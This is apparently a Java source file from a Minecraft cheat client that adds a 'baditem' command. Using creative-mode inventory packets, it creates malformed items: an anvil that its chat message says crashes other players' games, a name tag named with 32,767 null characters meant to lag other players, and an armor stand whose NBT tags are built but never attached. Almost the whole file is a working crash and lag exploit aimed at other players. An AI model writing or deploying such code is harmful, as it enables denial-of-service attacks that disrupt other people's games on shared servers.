package io.github.alerithe.client.features.commands.impl;

import io.github.alerithe.client.features.commands.Command;
import io.github.alerithe.client.features.commands.ErrorMessages;
import io.github.alerithe.client.utilities.EntityHelper;
import io.github.alerithe.client.utilities.GameHelper;
import io.github.alerithe.client.utilities.NetworkHelper;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

import java.util.Arrays;

public class CommandBadItem extends Command {
    private final String nameTagName;

    public CommandBadItem() {
        super("baditem", new String[0], "<anvil|tag|stand>");

        char[] ch = new char[32767];
        Arrays.fill(ch, '\0');
        nameTagName = new String(ch);
    }

    @Override
    public void execute(String[] args) {
        if (!EntityHelper.getUser().capabilities.isCreativeMode) {
            GameHelper.printChatMessage(ErrorMessages.format("You must be in Creative Mode to use this command."));
            return;
        }

        if (args.length < 1) {
            GameHelper.printChatMessage(ErrorMessages.NOT_ENOUGH_ARGS);
            return;
        }

        int slot = EntityHelper.getUser().inventory.currentItem + 36; // Set the item to spawn in their selected slot

        switch (args[0].toLowerCase()) {
            case "anvil":
                giveAnvil(slot);
                break;
            case "tag":
                giveNameTag(slot);
                break;
            case "stand":
                giveArmorStand(slot);
                break;
            default:
                GameHelper.printChatMessage(ErrorMessages.INVALID_ARG);
                break;
        }
    }

    private void giveAnvil(int slot) {
        ItemStack stack = new ItemStack(Blocks.anvil, 64, 3);
        stack.setStackDisplayName("#HopeClient");
        NetworkHelper.sendPacket(new C10PacketCreativeInventoryAction(slot, stack));
        GameHelper.printChatMessage("Make other players place this Anvil to crash their game.");
    }

    private void giveNameTag(int slot) {
        ItemStack stack = new ItemStack(Items.name_tag, 64);
        stack.setStackDisplayName(nameTagName);
        NetworkHelper.sendPacket(new C10PacketCreativeInventoryAction(slot, stack));
        GameHelper.printChatMessage("Apply this tag to an entity to lag other players.");
    }

    private void giveArmorStand(int slot) {
        ItemStack stack = new ItemStack(Items.armor_stand, 64);
        stack.setStackDisplayName("#HopeClient");
        NBTTagCompound tags = new NBTTagCompound();
        tags.setInteger("Invisible", 1);
        tags.setByte("NoGravity", (byte) 1);
        tags.setDouble("x", 42);
        tags.setDouble("y", 69);
        tags.setDouble("z", 42);
        NetworkHelper.sendPacket(new C10PacketCreativeInventoryAction(slot, stack));
        GameHelper.printChatMessage("Use this armor stand to spawn it at x:42 y:69 z:42.");
    }
}
